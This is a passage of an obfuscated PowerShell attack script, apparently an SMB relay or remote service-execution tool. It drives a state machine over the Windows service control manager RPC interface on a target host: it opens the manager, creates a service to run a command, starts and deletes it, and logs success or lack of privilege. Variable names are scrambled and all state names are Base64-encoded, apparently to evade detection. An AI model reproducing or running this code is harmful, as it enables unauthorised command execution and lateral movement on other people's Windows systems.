                            if(${10001101011100010}.domain_mapping_table.ContainsKey(${10001110110010100}))
                            {
                                ${00011001000001101} = (${00101100100001000} + "@" + ${10001101011100010}.domain_mapping_table.${10001110110010100}).ToUpper()
                            }
                            else
                            {
                                ${00011001000001101} = ${01001111001000100}
                            }
                            for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
                            {
                                if(${10001101011100010}.enumerate[${10000101000101100}].IP -eq $target)
                                {
                                    ${01100011000100110} = ${10000101000101100}
                                    break
                                }
                            }
                            [Array]${01001011110111010} = ${10001101011100010}.enumerate[${01100011000100110}].Privileged
                            if(${01001011110111010} -notcontains ${00011001000001101})
                            {
                                ${01001011110111010} += ${00011001000001101}
                                ${10001101011100010}.enumerate[${01100011000100110}].Privileged = ${01001011110111010}
                            }
                            if(${_10001111100011011})
                            {
                                ${10101001011110010} = $true
                                ${10011110011111101} = 2
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                            }
                            elseif(${00111011100110101}.Length -lt ${00110111010000001})
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                            }
                            else
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                            }
                        }
                        elseif([System.BitConverter]::ToString(${10111110001011100}[128..131]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            if($Attack -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))))
                            {
                                ${10000001100000110} = $true
                            }
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${01001111001000100} does not have command execution privilege on $Target") > $null
                            ${01100001000000011} = ${10111110001011100}[108..127]
                            ${10011110011111101} = 2
                            ${10011111011010000}++
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                        }
                        else
                        {
                            ${10000001100000110} = $true
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x06,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _10010111100111001 ${01001001010000101}
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100}
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                    {
                        if(${10011110011111101} -eq 1)
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Service ${01001011011010100} deleted on $Target") > $null
                            ${10011110011111101}++
                            ${10000111110001010} = _10011111000101110 ${00111111011000001}
                        }
                        else
                        {
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            ${10000111110001010} = _10011111000101110 ${01100001000000011}
                        }
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00111011100110101} = _00110101111101011 ${10000111110001010}
                        ${00110101010010001} = _10101110101101000 0x03 ${00111011100110101}.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001} 
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} (${00011000101001110}.Length + ${00111011100110101}.Length)
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00111011100110101}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110} + ${00111011100110101}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${01011110000111110} = ${10111110001011100}[40..43]
                        ${00100010110000001} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x05,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _10100101010101111 ${00100010110000001}
                        ${00010110001011100}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAF8AQQBjAGMAZQBzAHMA')))] = 0x07,0x00,0x00,0x00  
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100}  
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00110101010010001} = _10101110101101000 0x03 ${00111011100110101}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} (${00011000101001110}.Length + ${00111011100110101}.Length)
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00111011100110101}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110} + ${00111011100110101}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                    {
                        ${00101010001011111} = [Math]::Ceiling(${00111011100110101}.Length / ${00110111010000001})
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10010111011101100} = ${00111011100110101}[0..(${00110111010000001} - 1)]
                        ${00110101010010001} = _10101110101101000 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${10010111011101100}
                        ${00110101010010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${00111011100110101}.Length)
                        ${00001111111111001} = ${00110111010000001}
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} ${00011000101001110}.Length
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                    {
                        ${01111000110110001}++
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${01000011110110100} = ${00111011100110101}[${00001111111111001}..(${00001111111111001} + ${00110111010000001} - 1)]
                        ${00001111111111001} += ${00110111010000001}
                        ${00110101010010001} = _10101110101101000 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${01000011110110100}
                        ${00110101010010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${00111011100110101}.Length - ${00001111111111001} + ${00110111010000001})
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} ${00011000101001110}.Length
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00000001011010011} = ${00111011100110101}[${00001111111111001}..${00111011100110101}.Length]
                        ${00110101010010001} = _10101110101101000 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${00000001011010011}
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} ${00011000101001110}.Length
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                    { 
                        if([System.BitConverter]::ToString(${10111110001011100}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBkAC0AMAA0AC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Command executed on $Target") > $null
                        }
                        elseif([System.BitConverter]::ToString(${10111110001011100}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Service ${01001011011010100} failed to start on $Target") > $null
                        }
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${10000111110001010} = _00110111011101100 ${00111111011000001}
                        ${00111011100110101} = _00110101111101011 ${10000111110001010}
                        ${00110101010010001} = _10101110101101000 0x03 ${00111011100110101}.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} (${00011000101001110}.Length + ${00111011100110101}.Length)
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00111011100110101}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110} + ${00111011100110101}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x02,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _01101010011100001
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100}
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${10000111110001010} = _01010011111111010 ${01011010010011111} ${10110100110011010}
                        ${00111011100110101} = _00110101111101011 ${10000111110001010}
                        ${00110101010010001} = _10101110101101000 0x03 ${00111011100110101}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001} 
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} (${00011000101001110}.Length + ${00111011100110101}.Length)
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00111011100110101}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110} + ${00111011100110101}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))         
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                    {
                        sleep -m 150
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x08,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00010110001011100} = _01110101010111110 ${01001001010000101}
                        ${00010110001011100}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA')))] = 0xff,0x00,0x00,0x00
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${10010110001100010}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} 
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                    {
                        ${00100010110000001} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                        ${01001001010000101} = ${10111110001011100}[132..147]
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                        ${00110101010010001} = _10011111111001010 0x48,0x00 1 0x01 0x00,0x00 ${00011110010010101} 0x02,0x00
                        ${00011000101001110} = _00110101111101011 ${00110101010010001} 
                        ${00010110001011100} = _11000000110000001 ${01001001010000101} ${00011000101001110}.Length
                        ${01111101100001011} = _00110101111101011 ${00110000000111010}
                        ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                        ${01000111100110100} = ${10010110001100010}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    {
                        ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
                        ${00001111100000001}.Flush()
                        ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                        if(_00001000001001111 ${10111110001011100}[12..15])
                        {
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                        }
                        else
                        {
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                    {
                        if([System.BitConverter]::ToString(${10111110001011100}[132..135]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Service ${01001011011010100} created on $Target") > $null
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Trying to execute command on $Target") > $null
                            ${00111111011000001} = ${10111110001011100}[112..131]
                            ${10011111011010000}++
                            ${00111110010110110} = ${00000100101011111}
                            ${00110000000111010} = _01101011100000110 0x09,0x00 0x01,0x00 $false ${10011111011010000} ${_00000000111100011} ${01011110000111110} ${_10110110010000000}
                            ${10000111110001010} = _00101000001101001 ${00111111011000001}
                            ${00111011100110101} = _00110101111101011 ${10000111110001010}
                            ${00110101010010001} = _10101110101101000 0x03 ${00111011100110101}.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            ${00011000101001110} = _00110101111101011 ${00110101010010001} 
                            ${00010110001011100} = _11000000110000001 ${01001001010000101} (${00011000101001110}.Length + ${00111011100110101}.Length)
                            ${01111101100001011} = _00110101111101011 ${00110000000111010}
                            ${10010110001100010} = _00110101111101011 ${00010110001011100} 
                            ${01000111100110100} = ${10010110001100010}.Length + ${00111011100110101}.Length + ${00011000101001110}.Length
                            ${10001001101011001} = _00111011110001101 ${01111101100001011}.Length ${01000111100110100}
                            ${00101101010001101} = _00110101111101011 ${10001001101011001}
                            ${00101010111110011} = ${00101101010001101} + ${01111101100001011} + ${10010110001100010} + ${00011000101001110} + ${00111011100110101}
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))   
                        }
                        elseif([System.BitConverter]::ToString(${10111110001011100}[132..135]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwAxAC0AMAA0AC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] Service ${01001011011010100} creation failed on $Target") > $null
                            ${10000001100000110} = $true
                        }
                        else
                        {
                            ${10000001100000110} = $true
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                    {
                        ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length)
                        if([System.BitConverter]::ToString(${10111110001011100}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${00000100101011111} = ${10001010100111000}
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                    {
                        switch (${00111110010110110})
                        {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                            {
                                if(${10011110011111101} -eq 2)
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            {
                                ${01010110110010100} = ${10111110001011100}[132..147]
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                            {
                                if(${00101010001011111} -le 2)
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                                }
                                else
                                {
                                    ${01111000110110001} = 2
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                            {
                                if(${01111000110110001} -ge ${00101010001011111})
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                                ${10011110011111101} = 1
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA=='))) 
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                            {
                                ${00000100101011111} = ${10001010100111000}
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAVwA=')))
                            {
                                ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))  
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                            {
